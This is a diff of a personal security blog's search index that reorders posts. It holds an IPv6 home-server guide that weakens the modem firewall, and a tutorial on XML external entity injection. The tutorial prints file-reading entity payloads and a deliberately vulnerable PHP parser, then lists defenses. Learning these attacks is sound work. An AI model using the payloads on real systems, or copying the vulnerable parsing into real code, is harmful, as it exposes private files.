@@ -1,138 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>利用ipv6实现公网ip</title>
-    <url>/post/Using-ipv6-to-realize-public-ip/</url>
-    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
-<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
-<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
-<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
-<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
-<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
-<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
-<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
-<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
-<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>ipv6配置</p>
-<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
-<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里光猫的配置就结束了</p>
-<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
-<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>设置防火墙的入站规则，开启80端口</p>
-<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
-<p>对自己的ipv6进行测试</p>
-<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
-<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
-<h3 id="一些小缺陷">一些小缺陷</h3>
-<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
-<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
-<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
-<h3 id="接下来的目标">接下来的目标</h3>
-<p>1.购买域名，通过域名访问公网ipv6</p>
-<p>2.在linux系统中配置ipv6公网地址</p>
-<h3 id="大佬的文章">大佬的文章</h3>
-<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
-<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE漏洞详解</title>
-    <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="简介">简介</h1>
-<p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p>
-<p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p>
-<h1 id="XML基础">XML基础</h1>
-<p>要明白XXE,我们可以首先从XML基础学起。</p>
-<p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
-<p>例如下面这一段就是标准的XML文档</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p>
-<p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
-<h1 id="DTD实体">DTD实体</h1>
-<p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
-<p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p>
-<p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p>
-<p>使用方式：<code>&amp;名字;</code></p>
-<p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在浏览器中打开</p>
-<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p>
-<p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
-<p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>admin.txt中的内容如下<br>
-<img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p>
-<p>在IE8浏览器(其他浏览器显示不出来)中打开</p>
-<p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p>
-<p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
-<p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
-<h1 id="PHP中的XML">PHP中的XML</h1>
-<p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p>
-<p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td>必需。规定要使用的 XML 字符串。</td>
-</tr>
-<tr>
-<td>class</td>
-<td>可选。规定新对象的 class。</td>
-</tr>
-<tr>
-<td>options</td>
-<td>可选。规定附加的 Libxml 参数。</td>
-</tr>
-<tr>
-<td>ns</td>
-<td>可选。</td>
-</tr>
-<tr>
-<td>is_prefix</td>
-<td>可选。</td>
-</tr>
-</tbody>
-</table>
-<p>一个简单的例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
-<p>利用XXE读取log.txt的内容<br>
-<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p>
-<h1 id="防御">防御</h1>
-<p>XXE的防御一般通过两种方式<br>
-1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
-2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>agent内存马学习</title>
     <url>/post/agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>在Java中,agent是一种可以在运行时修改字节码的机制,它可以用来实现诸如性能监控、代码覆盖率分析、日志记录等功能。java agent主要分为两种——<code>premain</code>和<code>agentmain</code></p>
@@ -239,6 +107,57 @@
     <url>/post/happy-new-year/</url>
     <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>利用ipv6实现公网ip</title>
+    <url>/post/Using-ipv6-to-realize-public-ip/</url>
+    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
+<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
+<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
+<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
+<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
+<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
+<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
+<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
+<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
+<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>ipv6配置</p>
+<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
+<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里光猫的配置就结束了</p>
+<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
+<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>设置防火墙的入站规则，开启80端口</p>
+<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
+<p>对自己的ipv6进行测试</p>
+<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
+<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
+<h3 id="一些小缺陷">一些小缺陷</h3>
+<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
+<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
+<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
+<h3 id="接下来的目标">接下来的目标</h3>
+<p>1.购买域名，通过域名访问公网ipv6</p>
+<p>2.在linux系统中配置ipv6公网地址</p>
+<h3 id="大佬的文章">大佬的文章</h3>
+<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
+<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+      </tags>
   </entry>
   <entry>
     <title>java反序列化之DNSURL和CommonsCollections</title>
@@ -586,6 +505,160 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </tags>
   </entry>
   <entry>
+    <title>XXE漏洞详解</title>
+    <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="简介">简介</h1>
+<p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p>
+<p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p>
+<h1 id="XML基础">XML基础</h1>
+<p>要明白XXE,我们可以首先从XML基础学起。</p>
+<p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
+<p>例如下面这一段就是标准的XML文档</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p>
+<p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
+<h1 id="DTD实体">DTD实体</h1>
+<p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
+<p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p>
+<p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p>
+<p>使用方式：<code>&amp;名字;</code></p>
+<p>例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器中打开</p>
+<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p>
+<p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
+<p>例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>admin.txt中的内容如下<br>
+<img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p>
+<p>在IE8浏览器(其他浏览器显示不出来)中打开</p>
+<p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p>
+<p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
+<p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
+<h1 id="PHP中的XML">PHP中的XML</h1>
+<p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p>
+<p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。规定要使用的 XML 字符串。</td>
+</tr>
+<tr>
+<td>class</td>
+<td>可选。规定新对象的 class。</td>
+</tr>
+<tr>
+<td>options</td>
+<td>可选。规定附加的 Libxml 参数。</td>
+</tr>
+<tr>
+<td>ns</td>
+<td>可选。</td>
+</tr>
+<tr>
+<td>is_prefix</td>
+<td>可选。</td>
+</tr>
+</tbody>
+</table>
+<p>一个简单的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
+<p>利用XXE读取log.txt的内容<br>
+<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p>
+<h1 id="防御">防御</h1>
+<p>XXE的防御一般通过两种方式<br>
+1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
